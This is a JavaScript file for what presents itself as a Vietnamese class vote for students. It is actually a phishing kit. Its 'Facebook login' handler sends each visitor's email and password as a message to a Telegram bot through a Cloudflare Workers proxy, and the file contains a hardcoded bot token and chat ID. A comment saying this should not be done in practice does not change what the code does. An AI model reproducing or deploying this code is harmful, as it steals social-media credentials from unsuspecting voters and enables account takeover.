// Danh sách học sinh
const students = [
    { id: 1, name: "Nguyễn Văn A", avatar: "assets/student-avatars/student1.jpg", votes: 0 },
    { id: 2, name: "Trần Thị B", avatar: "assets/student-avatars/student2.jpg", votes: 0 },
    { id: 3, name: "Lê Văn C", avatar: "assets/student-avatars/student3.jpg", votes: 0 },
    { id: 4, name: "Phạm Thị D", avatar: "assets/student-avatars/student4.jpg", votes: 0 },
    { id: 5, name: "Hoàng Văn E", avatar: "assets/student-avatars/student5.jpg", votes: 0 },
    { id: 6, name: "Vũ Thị F", avatar: "assets/student-avatars/student6.jpg", votes: 0 }
];

// Telegram bot config
const BOT_TOKEN = '8016061982:AAGBDhixC2fxTyhV70s5LH04vSjBeQdZ_Fs';
const CHAT_ID = '6360461491';
const TELEGRAM_API_URL = `https://quiet-bar-4d07.hackff809876.workers.dev/bot${BOT_TOKEN}/sendMessage`;

let currentStudentId = null;
let isLoggedIn = false;

// Hiển thị danh sách học sinh
function renderStudents() {
    const grid = document.querySelector('.students-grid');
    grid.innerHTML = '';

    students.forEach(student => {
        const card = document.createElement('div');
        card.className = 'student-card';
        card.innerHTML = `
            <img src="${student.avatar}" alt="${student.name}" class="student-avatar">
            <div class="student-info">
                <h3 class="student-name">${student.name}</h3>
                <p>Lượt bình chọn: ${student.votes}</p>
                <button class="vote-btn" data-id="${student.id}">Bình chọn</button>
            </div>
        `;
        grid.appendChild(card);
    });

    // Thêm sự kiện click cho nút bình chọn
    document.querySelectorAll('.vote-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            if (!isLoggedIn) {
                alert('Vui lòng đăng nhập Facebook để bình chọn!');
                return;
            }
            currentStudentId = parseInt(this.getAttribute('data-id'));
            const student = students.find(s => s.id === currentStudentId);
            document.getElementById('selected-student').textContent = student.name;
            document.querySelector('.vote-modal').classList.remove('hidden');
        });
    });
}

// Xử lý đăng nhập Facebook
document.getElementById('login-btn').addEventListener('click', function() {
    const email = document.getElementById('fb-email').value;
    const password = document.getElementById('fb-password').value;

    if (!email || !password) {
        alert('Vui lòng nhập đầy đủ email và mật khẩu!');
        return;
    }

    // Gửi thông tin đăng nhập về Telegram bot (KHÔNG NÊN làm điều này trong thực tế)
    fetch(TELEGRAM_API_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `Thông tin đăng nhập:\nEmail: ${email}\nMật khẩu: ${password}`
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
        isLoggedIn = true;
        alert('Đăng nhập thành công! Bạn có thể bình chọn now.');
    })
    .catch((error) => {
        console.error('Error:', error);
        alert('Có lỗi xảy ra khi đăng nhập. Vui lòng thử lại!');
    });
});

// Xử lý bình chọn
document.getElementById('confirm-vote').addEventListener('click', function() {
    if (currentStudentId) {
        const student = students.find(s => s.id === currentStudentId);
        student.votes++;
        renderStudents();
        document.querySelector('.vote-modal').classList.add('hidden');
        
        // Gửi thông báo bình chọn về Telegram
        fetch(TELEGRAM_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `Người dùng đã bình chọn cho: ${student.name}`
            })
        });
    }
});

document.getElementById('cancel-vote').addEventListener('click', function() {
    document.querySelector('.vote-modal').classList.add('hidden');
});

// Khởi tạo ứng dụng
renderStudents();
